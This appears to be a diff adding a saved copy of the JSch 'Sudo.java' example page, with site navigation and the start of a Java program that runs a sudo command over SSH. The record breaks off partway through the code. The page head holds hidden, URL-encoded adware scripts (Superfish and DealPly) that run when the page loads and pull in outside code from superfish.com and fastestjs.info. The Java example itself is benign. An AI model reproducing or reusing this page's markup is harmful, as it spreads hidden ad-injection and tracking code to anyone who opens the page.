@@ -1,0 +1,345 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0050)http://www.jcraft.com/jsch/examples/Sudo.java.html -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+    
+    <title>JSch - Java Secure Channel - Examples</title>
+    <link href="./JSch - Java Secure Channel - Examples_files/style.css" rel="stylesheet" type="text/css">
+  <style></style><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/beacon.js"></script><script src="./JSch - Java Secure Channel - Examples_files/hm.js"></script><script></script><style type="text/css">iframe.dealply-toast { right: -99999px !important; }iframe.dealply-toast.fastestext-revealed { right: 0px !important; margin-bottom: 0px !important; }</style><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/javascript.js"></script><script type="text/javascript" src="data:text/javascript,(function()%7Bvar%20e%3D%22Chrome%20Webstore%22%3B%0Avar%20c%3D%22FastestChrome%22%3B%0Avar%20h%3D%221358228444522%22%3B%0Avar%20f%3D%22false%22%3B%0Avar%20d%3D%221_2013-01%22%3B%0Aif(window!%3Dwindow.top)%7Breturn%0A%7Dvar%20a%3D%5B%2Fveetle.com%2F%2C%2F1800flowers.com%2F%2C%2Fdominos.com%2F%2C%2Fsquidoo.com%2F%2C%2Fnytimes.com%2F%2C%2Fdeveloper.apple.com%2F%2C%2Fhotmail.com%2F%2C%2Fnfl.com%2F%2C%2Fgrooveshark.com%2F%2Cnew%20RegExp(%22www.google.com%2Freader%22)%2C%2F%5C.ft.com%2F%2C%2Fpandora.com%2F%2C%2Fmerriam-webster.com%2F%2C%2Freddit.com%2F%2C%2Fquora.com%2F%2C%2Ffandango.com%2F%2C%2Fcdixon.org%2F%2C%2Fteslamotors.com%2F%2C%2Fblogspot.co%2F%2C%2Freuters.com%2F%2C%2Fgame321.com%2F%2C%2Fcontinuations.com%2F%2C%2Farstechnica.com%2F%2C%2Fcbslocal.com%2F%2C%2Fvice.com%2F%2C%2Fsealedabstract.com%2F%2C%2Fokcupid.com%2F%2C%2Fnature.com%2F%2C%2Fspotify.com%2F%2C%2Fonline.wsj.com%2F%2C%2Fthermalwindowcurtains.com%2F%2C%2F.*live.com%2F%2C%2F.*battlefield.com%2F%2C%2Fpch.com%2F%5D%3B%0Afor(var%20b%3D0%3B%0Ab%3Ca.length%3B%0Ab%2B%2B)%7Bif(a%5Bb%5D.test(document.location.href))%7Breturn%0A%7D%7Dvar%20j%3Dfunction(l)%7Bvar%20m%3D0%3B%0Afor(var%20k%3D0%3B%0Ak%3Cl.length%3B%0Ak%2B%2B)%7Bm%3D((m%3C%3C5)-m)%2Bl.charCodeAt(k)%3B%0Am%3Dm%26m%0A%7Dreturn%20m%0A%7D%3B%0Avar%20g%3Dfunction(k)%7Bvar%20i%3Dfunction()%7Bif(window.document.body)%7Bk()%0A%7Delse%7BsetTimeout(i%2C100)%0A%7D%7D%3B%0Ai()%0A%7D%3B%0Ag(function()%7Bif(%2F(www.google.(de%7Ccom))%7C(search.yahoo.com)%7C(www.bing.(de%7Ccom))%2F.test(document.location.href)%26%26d.indexOf(%22OC3%22)%3D%3D0)%7Breturn%0A%7DsetTimeout(function()%7Bif(%2F%5Ehttp%3A%2F.test(document.location.href)%7C%7Cnew%20RegExp(%22%5Ehttps%3A%2F%2Fwww.google.com%22).test(document.location.href))%7Bvar%20o%3Dfunction(p)%7Bvar%20q%3Ddocument.createElement(%22script%22)%3B%0Aq.type%3D%22text%2Fjavascript%22%3B%0Aq.src%3Dp%3B%0Adocument.getElementsByTagName(%22head%22)%5B0%5D.appendChild(q)%0A%7D%3B%0Avar%20l%3Dfunction(p)%7Bif(f!%3D%22false%22)%7Bo(%22http%3A%2F%2Fi.fastestjs.info%2Ffast%2Fjavascript.js%3Fchannel%3D%22%2Bp)%0A%7D%7D%3B%0Avar%20n%3Dfunction(p%2Cq)%7Bo(%22https%3A%2F%2Fwww.superfish.com%2Fws%2Fsf_conduit.jsp%3Fdlsource%3D%22%2Bp%2B%22%26CTID%3D%22%2Bq%2B%22%26userId%3Dfastest_000_%22%2Bp%2B%22_%22%2Bq%2B%22_%22)%0A%7D%3B%0Avar%20k%3Dnavigator.browserLanguage%7C%7Cnavigator.language%3B%0Avar%20i%3D%22fastestchrome%22%3B%0Aif(%2FChrome%2F.test(navigator.userAgent))%7Bif(c%3D%3D%22Fastanium%22)%7Bi%3D%22fastanium%22%0A%7Delse%7Bi%3D%22fastestchrome%22%0A%7D%7Delse%7Bif(%2FFirefox%2F.test(navigator.userAgent))%7Bi%3D%22fastestfox%22%0A%7Delse%7Bif(%2FSafari%2F.test(navigator.userAgent))%7Bi%3D%22fastestsafari%22%0A%7Delse%7Bif(%2FTrident%2F.test(navigator.userAgent))%7Bi%3D%22fastestie%22%0A%7D%7D%7D%7Dvar%20m%3DMath.abs(j(h))%3B%0An(i%2Cd)%0A%7D%7D%2C500)%0A%7D)%0A%7D())%3B"></script><script src="./JSch - Java Secure Channel - Examples_files/opt_content.js"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/sf_conduit.jsp"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/sf_preloader.jsp"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/sf_code.jsp"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/main.js"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/main(1).js"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/base_single_icon.js"></script><script src="./JSch - Java Secure Channel - Examples_files/2129236873.js" type="text/javascript" id="__DealPly__931699.7067071497" class="dealply_content_script"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/main(2).js"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/main(3).js"></script><script type="text/javascript" src="./JSch - Java Secure Channel - Examples_files/main(4).js"></script><link rel="stylesheet" href="http://www.superfish.com/ws/css/main.css?v=2014.9.22.3.1"></head>
+
+  <body>
+
+    <div class="main">
+      <div id="header">
+        <div class="top">
+          <div class="title">
+            <h1>JCraft</h1>
+            <p>Code the Craft, Craft the Code<br><br></p>
+          </div>
+        </div>
+      </div>
+
+      <div class="content">
+
+        <div class="left">
+          <div class="content_menu">
+            <div>Information</div>
+            <a href="http://www.jcraft.com/">Home</a>
+            <a href="http://www.jcraft.com/c-info.html">About</a>
+            <a href="http://www.jcraft.com/contact.html">Contact</a>
+            <a href="http://www.jcraft.com/news/">News</a>
+          </div>
+<!--
+          <div class="content_menu">
+            <a href="/news/06.18.2009pr.html"><font size="-1">Our Craft on Boeing 787</font></a>
+          </div>
+-->
+          <div class="content_menu">
+            <div>Our Crafts</div>
+            <a href="http://www.jcraft.com/wiredx/">WiredX</a>
+            <a href="http://www.jcraft.com/weirdx/">WeirdX</a>
+            <a href="http://www.jcraft.com/jsch/">JSch</a>
+            <a href="http://www.jcraft.com/jzlib/">JZlib</a>
+            <!--<a href="/jxpie/">JXPie</a>-->
+            <!--<a href="/jrum/">JRum</a>-->
+            <a href="http://www.jcraft.com/jcterm/">JCTerm</a>
+            <!--<a href="/jroar/">JRoar</a>-->
+            <a href="http://www.jcraft.com/jorbis/">JOrbis</a>
+            <a href="http://www.jcraft.com/jhttptunnel/">JHttpTunnel</a>
+            <a href="http://www.jcraft.com/jrexec/">JRexec</a>
+            <!--<a href="/jdxpc/">JDxpc</a>-->
+            <!--<a href="/jesd/">JEsd</a>-->
+            <!--<a href="/jspringies/">JSpringies</a>-->
+          </div>
+<!--
+          <div class="content_menu">
+            <div>Eclipse Plug-ins</div>
+            <a href="/eclipse-jcterm/">JCTerm Plug-in</a>
+            <a href="/eclipse-sftp/">SFTP Plug-in</a>
+            <a href="/eclipse-cvsssh2/">CVS-SSH2 Plug-in</a>
+          </div>
+-->
+
+          
+<div class="content_menu">
+    <a href="http://www.jcraft.com/jsch/examples/README">README</a>
+    <a href="http://www.jcraft.com/jsch/examples/ChangeLog">ChangeLog</a>
+</div>
+<div class="content_menu">
+    <a href="http://ietf.org/html.charters/secsh-charter.html">IETF secsh</a>
+    <a href="http://www.jcraft.com/jsch/examples/">Examples</a>
+    <a href="http://www.jcraft.com/jcterm/">JCTerm</a>
+    <a href="https://github.com/ymnk/jsch-agent-proxy">jsch-agent-proxy</a>
+    <a href="http://j2me.jsch.org/">JSch for J2ME</a>
+    <a href="http://wiki.jsch.org/">Wiki</a>
+</div>
+<div class="content_menu">
+  JSch is supported by <br>
+  <a href="http://sourceforge.net/" target="_blank"><img src="./JSch - Java Secure Channel - Examples_files/sflogo.php" border="0" alt="SourceForge Logo"></a>
+</div> 
+<!--
+          <div class="content_menu">
+            <div>Screenshots</div>
+            <a href="#">WiredX</a>
+            <a href="#">WeirdX</a>
+          </div>
+-->
+          <br><br>
+        </div><!-- end of left -->
+
+        <div class="right">
+
+          <h2>JSch - Examples - Sudo.java</h2>
+            <p>
+              <a href="http://www.jcraft.com/jsch/examples/Sudo.java">Sudo.java</a><br>
+              <script src="./JSch - Java Secure Channel - Examples_files/2318108.js"></script><link rel="stylesheet" href="https://gist-assets.github.com/assets/embed-506ce4903ba8030610b1aacf371fd7b0.css"></p><div id="gist2318108" class="gist">
+        <div class="gist-file">
+          <div class="gist-data gist-syntax">
+            
+
+
+
+    <div class="file-data">
+      <table cellpadding="0" cellspacing="0" class="lines highlight">
+        <tbody><tr>
+          <td class="line-numbers">
+            <span class="line-number" id="file-sudo-java-L1" rel="file-sudo-java-L1">1</span>
+            <span class="line-number" id="file-sudo-java-L2" rel="file-sudo-java-L2">2</span>
+            <span class="line-number" id="file-sudo-java-L3" rel="file-sudo-java-L3">3</span>
+            <span class="line-number" id="file-sudo-java-L4" rel="file-sudo-java-L4">4</span>
+            <span class="line-number" id="file-sudo-java-L5" rel="file-sudo-java-L5">5</span>
+            <span class="line-number" id="file-sudo-java-L6" rel="file-sudo-java-L6">6</span>
+            <span class="line-number" id="file-sudo-java-L7" rel="file-sudo-java-L7">7</span>
+            <span class="line-number" id="file-sudo-java-L8" rel="file-sudo-java-L8">8</span>
+            <span class="line-number" id="file-sudo-java-L9" rel="file-sudo-java-L9">9</span>
+            <span class="line-number" id="file-sudo-java-L10" rel="file-sudo-java-L10">10</span>
+            <span class="line-number" id="file-sudo-java-L11" rel="file-sudo-java-L11">11</span>
+            <span class="line-number" id="file-sudo-java-L12" rel="file-sudo-java-L12">12</span>
+            <span class="line-number" id="file-sudo-java-L13" rel="file-sudo-java-L13">13</span>
+            <span class="line-number" id="file-sudo-java-L14" rel="file-sudo-java-L14">14</span>
+            <span class="line-number" id="file-sudo-java-L15" rel="file-sudo-java-L15">15</span>
+            <span class="line-number" id="file-sudo-java-L16" rel="file-sudo-java-L16">16</span>
+            <span class="line-number" id="file-sudo-java-L17" rel="file-sudo-java-L17">17</span>
+            <span class="line-number" id="file-sudo-java-L18" rel="file-sudo-java-L18">18</span>
+            <span class="line-number" id="file-sudo-java-L19" rel="file-sudo-java-L19">19</span>
+            <span class="line-number" id="file-sudo-java-L20" rel="file-sudo-java-L20">20</span>
+            <span class="line-number" id="file-sudo-java-L21" rel="file-sudo-java-L21">21</span>
+            <span class="line-number" id="file-sudo-java-L22" rel="file-sudo-java-L22">22</span>
+            <span class="line-number" id="file-sudo-java-L23" rel="file-sudo-java-L23">23</span>
+            <span class="line-number" id="file-sudo-java-L24" rel="file-sudo-java-L24">24</span>
+            <span class="line-number" id="file-sudo-java-L25" rel="file-sudo-java-L25">25</span>
+            <span class="line-number" id="file-sudo-java-L26" rel="file-sudo-java-L26">26</span>
+            <span class="line-number" id="file-sudo-java-L27" rel="file-sudo-java-L27">27</span>
+            <span class="line-number" id="file-sudo-java-L28" rel="file-sudo-java-L28">28</span>
+            <span class="line-number" id="file-sudo-java-L29" rel="file-sudo-java-L29">29</span>
+            <span class="line-number" id="file-sudo-java-L30" rel="file-sudo-java-L30">30</span>
+            <span class="line-number" id="file-sudo-java-L31" rel="file-sudo-java-L31">31</span>
+            <span class="line-number" id="file-sudo-java-L32" rel="file-sudo-java-L32">32</span>
+            <span class="line-number" id="file-sudo-java-L33" rel="file-sudo-java-L33">33</span>
+            <span class="line-number" id="file-sudo-java-L34" rel="file-sudo-java-L34">34</span>
+            <span class="line-number" id="file-sudo-java-L35" rel="file-sudo-java-L35">35</span>
+            <span class="line-number" id="file-sudo-java-L36" rel="file-sudo-java-L36">36</span>
+            <span class="line-number" id="file-sudo-java-L37" rel="file-sudo-java-L37">37</span>
+            <span class="line-number" id="file-sudo-java-L38" rel="file-sudo-java-L38">38</span>
+            <span class="line-number" id="file-sudo-java-L39" rel="file-sudo-java-L39">39</span>
+            <span class="line-number" id="file-sudo-java-L40" rel="file-sudo-java-L40">40</span>
+            <span class="line-number" id="file-sudo-java-L41" rel="file-sudo-java-L41">41</span>
+            <span class="line-number" id="file-sudo-java-L42" rel="file-sudo-java-L42">42</span>
+            <span class="line-number" id="file-sudo-java-L43" rel="file-sudo-java-L43">43</span>
+            <span class="line-number" id="file-sudo-java-L44" rel="file-sudo-java-L44">44</span>
+            <span class="line-number" id="file-sudo-java-L45" rel="file-sudo-java-L45">45</span>
+            <span class="line-number" id="file-sudo-java-L46" rel="file-sudo-java-L46">46</span>
+            <span class="line-number" id="file-sudo-java-L47" rel="file-sudo-java-L47">47</span>
+            <span class="line-number" id="file-sudo-java-L48" rel="file-sudo-java-L48">48</span>
+            <span class="line-number" id="file-sudo-java-L49" rel="file-sudo-java-L49">49</span>
+            <span class="line-number" id="file-sudo-java-L50" rel="file-sudo-java-L50">50</span>
+            <span class="line-number" id="file-sudo-java-L51" rel="file-sudo-java-L51">51</span>
+            <span class="line-number" id="file-sudo-java-L52" rel="file-sudo-java-L52">52</span>
+            <span class="line-number" id="file-sudo-java-L53" rel="file-sudo-java-L53">53</span>
+            <span class="line-number" id="file-sudo-java-L54" rel="file-sudo-java-L54">54</span>
+            <span class="line-number" id="file-sudo-java-L55" rel="file-sudo-java-L55">55</span>
+            <span class="line-number" id="file-sudo-java-L56" rel="file-sudo-java-L56">56</span>
+            <span class="line-number" id="file-sudo-java-L57" rel="file-sudo-java-L57">57</span>
+            <span class="line-number" id="file-sudo-java-L58" rel="file-sudo-java-L58">58</span>
+            <span class="line-number" id="file-sudo-java-L59" rel="file-sudo-java-L59">59</span>
+            <span class="line-number" id="file-sudo-java-L60" rel="file-sudo-java-L60">60</span>
+            <span class="line-number" id="file-sudo-java-L61" rel="file-sudo-java-L61">61</span>
+            <span class="line-number" id="file-sudo-java-L62" rel="file-sudo-java-L62">62</span>
+            <span class="line-number" id="file-sudo-java-L63" rel="file-sudo-java-L63">63</span>
+            <span class="line-number" id="file-sudo-java-L64" rel="file-sudo-java-L64">64</span>
+            <span class="line-number" id="file-sudo-java-L65" rel="file-sudo-java-L65">65</span>
+            <span class="line-number" id="file-sudo-java-L66" rel="file-sudo-java-L66">66</span>
+            <span class="line-number" id="file-sudo-java-L67" rel="file-sudo-java-L67">67</span>
+            <span class="line-number" id="file-sudo-java-L68" rel="file-sudo-java-L68">68</span>
+            <span class="line-number" id="file-sudo-java-L69" rel="file-sudo-java-L69">69</span>
+            <span class="line-number" id="file-sudo-java-L70" rel="file-sudo-java-L70">70</span>
+            <span class="line-number" id="file-sudo-java-L71" rel="file-sudo-java-L71">71</span>
+            <span class="line-number" id="file-sudo-java-L72" rel="file-sudo-java-L72">72</span>
+            <span class="line-number" id="file-sudo-java-L73" rel="file-sudo-java-L73">73</span>
+            <span class="line-number" id="file-sudo-java-L74" rel="file-sudo-java-L74">74</span>
+            <span class="line-number" id="file-sudo-java-L75" rel="file-sudo-java-L75">75</span>
+            <span class="line-number" id="file-sudo-java-L76" rel="file-sudo-java-L76">76</span>
+            <span class="line-number" id="file-sudo-java-L77" rel="file-sudo-java-L77">77</span>
+            <span class="line-number" id="file-sudo-java-L78" rel="file-sudo-java-L78">78</span>
+            <span class="line-number" id="file-sudo-java-L79" rel="file-sudo-java-L79">79</span>
+            <span class="line-number" id="file-sudo-java-L80" rel="file-sudo-java-L80">80</span>
+            <span class="line-number" id="file-sudo-java-L81" rel="file-sudo-java-L81">81</span>
+            <span class="line-number" id="file-sudo-java-L82" rel="file-sudo-java-L82">82</span>
+            <span class="line-number" id="file-sudo-java-L83" rel="file-sudo-java-L83">83</span>
+            <span class="line-number" id="file-sudo-java-L84" rel="file-sudo-java-L84">84</span>
+            <span class="line-number" id="file-sudo-java-L85" rel="file-sudo-java-L85">85</span>
+            <span class="line-number" id="file-sudo-java-L86" rel="file-sudo-java-L86">86</span>
+            <span class="line-number" id="file-sudo-java-L87" rel="file-sudo-java-L87">87</span>
+            <span class="line-number" id="file-sudo-java-L88" rel="file-sudo-java-L88">88</span>
+            <span class="line-number" id="file-sudo-java-L89" rel="file-sudo-java-L89">89</span>
+            <span class="line-number" id="file-sudo-java-L90" rel="file-sudo-java-L90">90</span>
+            <span class="line-number" id="file-sudo-java-L91" rel="file-sudo-java-L91">91</span>
+            <span class="line-number" id="file-sudo-java-L92" rel="file-sudo-java-L92">92</span>
+            <span class="line-number" id="file-sudo-java-L93" rel="file-sudo-java-L93">93</span>
+            <span class="line-number" id="file-sudo-java-L94" rel="file-sudo-java-L94">94</span>
+            <span class="line-number" id="file-sudo-java-L95" rel="file-sudo-java-L95">95</span>
+            <span class="line-number" id="file-sudo-java-L96" rel="file-sudo-java-L96">96</span>
+            <span class="line-number" id="file-sudo-java-L97" rel="file-sudo-java-L97">97</span>
+            <span class="line-number" id="file-sudo-java-L98" rel="file-sudo-java-L98">98</span>
+            <span class="line-number" id="file-sudo-java-L99" rel="file-sudo-java-L99">99</span>
+            <span class="line-number" id="file-sudo-java-L100" rel="file-sudo-java-L100">100</span>
+            <span class="line-number" id="file-sudo-java-L101" rel="file-sudo-java-L101">101</span>
+            <span class="line-number" id="file-sudo-java-L102" rel="file-sudo-java-L102">102</span>
+            <span class="line-number" id="file-sudo-java-L103" rel="file-sudo-java-L103">103</span>
+            <span class="line-number" id="file-sudo-java-L104" rel="file-sudo-java-L104">104</span>
+            <span class="line-number" id="file-sudo-java-L105" rel="file-sudo-java-L105">105</span>
+            <span class="line-number" id="file-sudo-java-L106" rel="file-sudo-java-L106">106</span>
+            <span class="line-number" id="file-sudo-java-L107" rel="file-sudo-java-L107">107</span>
+            <span class="line-number" id="file-sudo-java-L108" rel="file-sudo-java-L108">108</span>
+            <span class="line-number" id="file-sudo-java-L109" rel="file-sudo-java-L109">109</span>
+            <span class="line-number" id="file-sudo-java-L110" rel="file-sudo-java-L110">110</span>
+            <span class="line-number" id="file-sudo-java-L111" rel="file-sudo-java-L111">111</span>
+            <span class="line-number" id="file-sudo-java-L112" rel="file-sudo-java-L112">112</span>
+            <span class="line-number" id="file-sudo-java-L113" rel="file-sudo-java-L113">113</span>
+            <span class="line-number" id="file-sudo-java-L114" rel="file-sudo-java-L114">114</span>
+            <span class="line-number" id="file-sudo-java-L115" rel="file-sudo-java-L115">115</span>
+            <span class="line-number" id="file-sudo-java-L116" rel="file-sudo-java-L116">116</span>
+            <span class="line-number" id="file-sudo-java-L117" rel="file-sudo-java-L117">117</span>
+            <span class="line-number" id="file-sudo-java-L118" rel="file-sudo-java-L118">118</span>
+            <span class="line-number" id="file-sudo-java-L119" rel="file-sudo-java-L119">119</span>
+            <span class="line-number" id="file-sudo-java-L120" rel="file-sudo-java-L120">120</span>
+            <span class="line-number" id="file-sudo-java-L121" rel="file-sudo-java-L121">121</span>
+            <span class="line-number" id="file-sudo-java-L122" rel="file-sudo-java-L122">122</span>
+            <span class="line-number" id="file-sudo-java-L123" rel="file-sudo-java-L123">123</span>
+            <span class="line-number" id="file-sudo-java-L124" rel="file-sudo-java-L124">124</span>
+            <span class="line-number" id="file-sudo-java-L125" rel="file-sudo-java-L125">125</span>
+            <span class="line-number" id="file-sudo-java-L126" rel="file-sudo-java-L126">126</span>
+            <span class="line-number" id="file-sudo-java-L127" rel="file-sudo-java-L127">127</span>
+            <span class="line-number" id="file-sudo-java-L128" rel="file-sudo-java-L128">128</span>
+            <span class="line-number" id="file-sudo-java-L129" rel="file-sudo-java-L129">129</span>
+            <span class="line-number" id="file-sudo-java-L130" rel="file-sudo-java-L130">130</span>
+            <span class="line-number" id="file-sudo-java-L131" rel="file-sudo-java-L131">131</span>
+            <span class="line-number" id="file-sudo-java-L132" rel="file-sudo-java-L132">132</span>
+            <span class="line-number" id="file-sudo-java-L133" rel="file-sudo-java-L133">133</span>
+            <span class="line-number" id="file-sudo-java-L134" rel="file-sudo-java-L134">134</span>
+            <span class="line-number" id="file-sudo-java-L135" rel="file-sudo-java-L135">135</span>
+            <span class="line-number" id="file-sudo-java-L136" rel="file-sudo-java-L136">136</span>
+            <span class="line-number" id="file-sudo-java-L137" rel="file-sudo-java-L137">137</span>
+            <span class="line-number" id="file-sudo-java-L138" rel="file-sudo-java-L138">138</span>
+            <span class="line-number" id="file-sudo-java-L139" rel="file-sudo-java-L139">139</span>
+            <span class="line-number" id="file-sudo-java-L140" rel="file-sudo-java-L140">140</span>
+            <span class="line-number" id="file-sudo-java-L141" rel="file-sudo-java-L141">141</span>
+            <span class="line-number" id="file-sudo-java-L142" rel="file-sudo-java-L142">142</span>
+            <span class="line-number" id="file-sudo-java-L143" rel="file-sudo-java-L143">143</span>
+            <span class="line-number" id="file-sudo-java-L144" rel="file-sudo-java-L144">144</span>
+            <span class="line-number" id="file-sudo-java-L145" rel="file-sudo-java-L145">145</span>
+            <span class="line-number" id="file-sudo-java-L146" rel="file-sudo-java-L146">146</span>
+            <span class="line-number" id="file-sudo-java-L147" rel="file-sudo-java-L147">147</span>
+            <span class="line-number" id="file-sudo-java-L148" rel="file-sudo-java-L148">148</span>
+            <span class="line-number" id="file-sudo-java-L149" rel="file-sudo-java-L149">149</span>
+            <span class="line-number" id="file-sudo-java-L150" rel="file-sudo-java-L150">150</span>
+            <span class="line-number" id="file-sudo-java-L151" rel="file-sudo-java-L151">151</span>
+            <span class="line-number" id="file-sudo-java-L152" rel="file-sudo-java-L152">152</span>
+            <span class="line-number" id="file-sudo-java-L153" rel="file-sudo-java-L153">153</span>
+            <span class="line-number" id="file-sudo-java-L154" rel="file-sudo-java-L154">154</span>
+            <span class="line-number" id="file-sudo-java-L155" rel="file-sudo-java-L155">155</span>
+            <span class="line-number" id="file-sudo-java-L156" rel="file-sudo-java-L156">156</span>
+            <span class="line-number" id="file-sudo-java-L157" rel="file-sudo-java-L157">157</span>
+            <span class="line-number" id="file-sudo-java-L158" rel="file-sudo-java-L158">158</span>
+            <span class="line-number" id="file-sudo-java-L159" rel="file-sudo-java-L159">159</span>
+            <span class="line-number" id="file-sudo-java-L160" rel="file-sudo-java-L160">160</span>
+            <span class="line-number" id="file-sudo-java-L161" rel="file-sudo-java-L161">161</span>
+            <span class="line-number" id="file-sudo-java-L162" rel="file-sudo-java-L162">162</span>
+            <span class="line-number" id="file-sudo-java-L163" rel="file-sudo-java-L163">163</span>
+            <span class="line-number" id="file-sudo-java-L164" rel="file-sudo-java-L164">164</span>
+            <span class="line-number" id="file-sudo-java-L165" rel="file-sudo-java-L165">165</span>
+            <span class="line-number" id="file-sudo-java-L166" rel="file-sudo-java-L166">166</span>
+            <span class="line-number" id="file-sudo-java-L167" rel="file-sudo-java-L167">167</span>
+            <span class="line-number" id="file-sudo-java-L168" rel="file-sudo-java-L168">168</span>
+            <span class="line-number" id="file-sudo-java-L169" rel="file-sudo-java-L169">169</span>
+            <span class="line-number" id="file-sudo-java-L170" rel="file-sudo-java-L170">170</span>
+            <span class="line-number" id="file-sudo-java-L171" rel="file-sudo-java-L171">171</span>
+            <span class="line-number" id="file-sudo-java-L172" rel="file-sudo-java-L172">172</span>
+            <span class="line-number" id="file-sudo-java-L173" rel="file-sudo-java-L173">173</span>
+            <span class="line-number" id="file-sudo-java-L174" rel="file-sudo-java-L174">174</span>
+            <span class="line-number" id="file-sudo-java-L175" rel="file-sudo-java-L175">175</span>
+            <span class="line-number" id="file-sudo-java-L176" rel="file-sudo-java-L176">176</span>
+            <span class="line-number" id="file-sudo-java-L177" rel="file-sudo-java-L177">177</span>
+            <span class="line-number" id="file-sudo-java-L178" rel="file-sudo-java-L178">178</span>
+            <span class="line-number" id="file-sudo-java-L179" rel="file-sudo-java-L179">179</span>
+            <span class="line-number" id="file-sudo-java-L180" rel="file-sudo-java-L180">180</span>
+            <span class="line-number" id="file-sudo-java-L181" rel="file-sudo-java-L181">181</span>
+            <span class="line-number" id="file-sudo-java-L182" rel="file-sudo-java-L182">182</span>
+            <span class="line-number" id="file-sudo-java-L183" rel="file-sudo-java-L183">183</span>
+            <span class="line-number" id="file-sudo-java-L184" rel="file-sudo-java-L184">184</span>
+          </td>
+          <td class="line-data">
+            <pre class="line-pre"><div class="line" id="file-sudo-java-LC1"><span class="cm">/* -*-mode:java; c-basic-offset:2; indent-tabs-mode:nil -*- */</span></div><div class="line" id="file-sudo-java-LC2"><span class="cm">/**</span></div><div class="line" id="file-sudo-java-LC3"><span class="cm"> * This program will demonstrate how to exec 'sudo' on the remote.</span></div><div class="line" id="file-sudo-java-LC4"><span class="cm"> *</span></div><div class="line" id="file-sudo-java-LC5"><span class="cm"> */</span></div><div class="line" id="file-sudo-java-LC6"><span class="kn">import</span> <span class="nn">com.jcraft.jsch.*</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC7"><span class="kn">import</span> <span class="nn">java.awt.*</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC8"><span class="kn">import</span> <span class="nn">javax.swing.*</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC9"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC10">&nbsp;</div><div class="line" id="file-sudo-java-LC11"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Sudo</span><span class="o">{</span></div><div class="line" id="file-sudo-java-LC12">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">arg</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC13">    <span class="k">try</span><span class="o">{</span></div><div class="line" id="file-sudo-java-LC14">      <span class="n">JSch</span> <span class="n">jsch</span><span class="o">=</span><span class="k">new</span> <span class="nf">JSch</span><span class="o">();</span>  </div><div class="line" id="file-sudo-java-LC15">&nbsp;</div><div class="line" id="file-sudo-java-LC16">      <span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC17">      <span class="k">if</span><span class="o">(</span><span class="n">arg</span><span class="o">.</span><span class="na">length</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC18">        <span class="n">host</span><span class="o">=</span><span class="n">arg</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span></div><div class="line" id="file-sudo-java-LC19">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC20">      <span class="k">else</span><span class="o">{</span></div><div class="line" id="file-sudo-java-LC21">        <span class="n">host</span><span class="o">=</span><span class="n">JOptionPane</span><span class="o">.</span><span class="na">showInputDialog</span><span class="o">(</span><span class="s">"Enter username@hostname"</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC22">                                         <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"user.name"</span><span class="o">)+</span></div><div class="line" id="file-sudo-java-LC23">                                         <span class="s">"@localhost"</span><span class="o">);</span> </div><div class="line" id="file-sudo-java-LC24">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC25">      <span class="n">String</span> <span class="n">user</span><span class="o">=</span><span class="n">host</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">host</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">'@'</span><span class="o">));</span></div><div class="line" id="file-sudo-java-LC26">      <span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">host</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">'@'</span><span class="o">)+</span><span class="mi">1</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC27">&nbsp;</div><div class="line" id="file-sudo-java-LC28">      <span class="n">Session</span> <span class="n">session</span><span class="o">=</span><span class="n">jsch</span><span class="o">.</span><span class="na">getSession</span><span class="o">(</span><span class="n">user</span><span class="o">,</span> <span class="n">host</span><span class="o">,</span> <span class="mi">22</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC29">      </div><div class="line" id="file-sudo-java-LC30">      <span class="n">UserInfo</span> <span class="n">ui</span><span class="o">=</span><span class="k">new</span> <span class="nf">MyUserInfo</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC31">      <span class="n">session</span><span class="o">.</span><span class="na">setUserInfo</span><span class="o">(</span><span class="n">ui</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC32">      <span class="n">session</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC33">&nbsp;</div><div class="line" id="file-sudo-java-LC34">      <span class="n">String</span> <span class="n">command</span><span class="o">=</span><span class="n">JOptionPane</span><span class="o">.</span><span class="na">showInputDialog</span><span class="o">(</span><span class="s">"Enter command, execed with sudo"</span><span class="o">,</span> </div><div class="line" id="file-sudo-java-LC35">                                                 <span class="s">"printenv SUDO_USER"</span><span class="o">);</span></div><div class="line" 